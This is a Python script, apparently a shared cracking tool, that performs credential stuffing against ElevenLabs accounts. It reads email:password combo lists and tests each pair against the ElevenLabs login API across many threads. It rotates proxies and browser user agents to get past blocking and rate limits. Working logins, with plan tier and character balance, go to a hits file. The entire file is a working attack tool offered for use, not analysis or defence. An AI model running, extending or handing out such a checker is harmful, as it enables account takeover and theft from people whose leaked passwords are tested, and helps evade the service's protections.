import os
import random
import requests
import time
import warnings
import threading
import shutil
from queue import Queue
from colorama import init, Fore, Style

warnings.filterwarnings("ignore")
init(autoreset=True)
columns = shutil.get_terminal_size(fallback=(80, 20)).columns
os.system('cls' if os.name == 'nt' else 'clear')

print(f"{Fore.CYAN}{'ELEVENLABS.IO CHECKER'.center(columns)}")
print(f"{Fore.YELLOW}{'Code By — @LEGEND_BL'.center(columns)}")

# FIX: Strip quotes and whitespace from input
combo_input = input(f"\n{Fore.CYAN}Combo file (default: combo.txt): {Style.RESET_ALL}").strip()
# Remove quotes if user accidentally includes them
combo_file = combo_input.strip('"').strip("'").strip() or "combo.txt"

def load_combos(fn):
    """Load combos with proper error handling for filenames"""
    try:
        # FIX: Strip any quotes from filename
        fn = fn.strip().strip('"').strip("'").strip()
        
        # Check if file exists
        if not os.path.exists(fn):
            print(f"{Fore.RED}[-] File not found: {fn}")
            return []
        
        with open(fn, encoding="utf-8", errors="ignore") as f:
            combos = []
            for line in f:
                line = line.strip()
                if ":" in line and line:
                    combos.append(line)
            return combos
    except OSError as e:
        print(f"{Fore.RED}[-] Error opening file: {e}")
        print(f"{Fore.YELLOW}[!] Try removing quotes from the filename")
        return []
    except Exception as e:
        print(f"{Fore.RED}[-] Error: {e}")
        return []

def load_proxies():
    """Load proxies with proper error handling"""
    try:
        proxy_file = "proxy.txt"
        if not os.path.exists(proxy_file):
            print(f"{Fore.RED}[-] proxy.txt not found!")
            return []
        
        with open(proxy_file, encoding="utf-8", errors="ignore") as f:
            proxies = [ln.strip() for ln in f if ln.strip()]
            if not proxies:
                print(f"{Fore.RED}[-] proxy.txt is empty!")
                return []
            return proxies
    except Exception as e:
        print(f"{Fore.RED}[-] Error loading proxies: {e}")
        return []

combos = load_combos(combo_file)
proxies = load_proxies()

if not combos:
    input(f"\n{Fore.RED}No combos found. Press Enter to exit...")
    exit()
if not proxies:
    input(f"\n{Fore.RED}No proxies found. Press Enter to exit...")
    exit()

threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
threads_count = max(1, min(50, int(threads_input) if threads_input.isdigit() else 10))

print(f"{Fore.CYAN}Loaded {len(combos)} combos | {len(proxies)} proxies | Threads: {threads_count}\n")

hit_counter = fail_counter = checked = 0
lock = threading.Lock()
start_time = time.time()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]

def format_proxy(p):
    """Format proxy string to requests format - supports all types"""
    try:
        p = p.strip()
        if not p:
            return None
        
        ptype = "http"
        
        # Check for protocol prefix
        if "://" in p:
            proto = p.split("://")[0].lower()
            p = p.split("://", 1)[1]
            if proto in ["socks5", "socks5h"]:
                ptype = "socks5h"
            elif proto == "socks4":
                ptype = "socks4"
        
        # Format: user:pass@host:port
        if "@" in p:
            auth, hp = p.rsplit("@", 1)
            h, po = hp.split(":")
            u, pw = auth.split(":", 1)
            url = f"{ptype}://{u}:{pw}@{h}:{po}"
        else:
            parts = p.split(":")
            # Format: host:port:user:pass
            if len(parts) == 4:
                url = f"{ptype}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            # Format: host:port
            elif len(parts) == 2:
                url = f"{ptype}://{parts[0]}:{parts[1]}"
            else:
                return None
        
        return {"http": url, "https": url}
    except:
        return None

def get_cpm():
    """Calculate checks per minute"""
    elapsed = time.time() - start_time
    return round((checked / elapsed) * 60, 1) if elapsed > 0 else 0

def check_account(email, pwd, proxy_dict):
    """Check ElevenLabs account"""
    s = requests.Session()
    ua = random.choice(USER_AGENTS)
    
    try:
        headers = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "Origin": "https://elevenlabs.io",
            "Referer": "https://elevenlabs.io/",
        }
        
        # ElevenLabs login API
        payload = {
            "email": email,
            "password": pwd
        }
        
        r = s.post("https://api.elevenlabs.io/v1/user/login",
                   json=payload, headers=headers, proxies=proxy_dict, 
                   timeout=15, verify=False)
        
        txt = r.text.lower()
        
        if r.status_code == 200:
            if any(x in txt for x in ["xi_api_key", "token", "subscription", "user_id", "xi-api-key"]):
                # Try to get subscription info
                try:
                    data = r.json()
                    sub = data.get("subscription", {}).get("tier", "Unknown")
                    chars = data.get("subscription", {}).get("character_count", 0)
                    return "hit", f"Valid | Plan: {sub} | Chars: {chars}"
                except:
                    return "hit", "Valid Account"
            elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
                return "fail", "Invalid"
            else:
                return "fail", f"Unknown response"
        elif r.status_code == 401:
            return "fail", "Invalid credentials"
        elif r.status_code == 403:
            return "fail", "Blocked"
        elif r.status_code == 429:
            return "retry", "Rate limited"
        else:
            return "fail", f"Status {r.status_code}"
            
    except requests.exceptions.Timeout:
        return "error", "Timeout"
    except requests.exceptions.ProxyError:
        return "error", "Proxy error"
    except Exception as e:
        return "error", str(e)[:30]

def worker(q):
    """Worker thread to process combos"""
    global checked, hit_counter, fail_counter
    
    while True:
        try:
            combo = q.get_nowait()
        except:
            break
        
        # Parse combo
        parts = combo.split(":", 1)
        if len(parts) != 2:
            q.task_done()
            continue
        
        email, pwd = parts[0].strip(), parts[1].strip()
        
        result, reason = "error", "No proxy"
        
        # Try with different proxies
        for attempt in range(3):
            proxy_dict = format_proxy(random.choice(proxies))
            if proxy_dict:
                result, reason = check_account(email, pwd, proxy_dict)
                if result == "retry":
                    time.sleep(2)
                    continue
                if result != "error":
                    break
                time.sleep(0.5)
        
        with lock:
            checked += 1
            if result == "hit":
                hit_counter += 1
                print(f"{Fore.GREEN}[HIT] {email}:{pwd} | {reason} | CPM: {get_cpm()}")
                with open("Elevenlab_Hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{pwd} | {reason}\n")
            else:
                fail_counter += 1
                print(f"{Fore.RED}[FAIL] {email}:{pwd} | {reason} | CPM: {get_cpm()}")
        
        q.task_done()
        time.sleep(0.1)

def main():
    """Main function"""
    q = Queue()
    for c in combos:
        q.put(c)
    
    # Clear hits file
    open("Elevenlab_Hits.txt", "w").close()
    
    # Start worker threads
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(q,), daemon=True)
        t.start()
        threads.append(t)
    
    # Wait for completion
    q.join()
    
    # Print summary
    print(f"\n{Fore.CYAN}{'='*50}")
    print(f"{Fore.GREEN}Finished!")
    print(f"{Fore.GREEN}Hits: {hit_counter} | {Fore.RED}Failed: {fail_counter}")
    print(f"{Fore.YELLOW}Final CPM: {get_cpm()}")
    print(f"{Fore.CYAN}Hits saved to Elevenlab_Hits.txt")
    input(f"\nPress Enter to exit...")

if __name__ == "__main__":
    main()
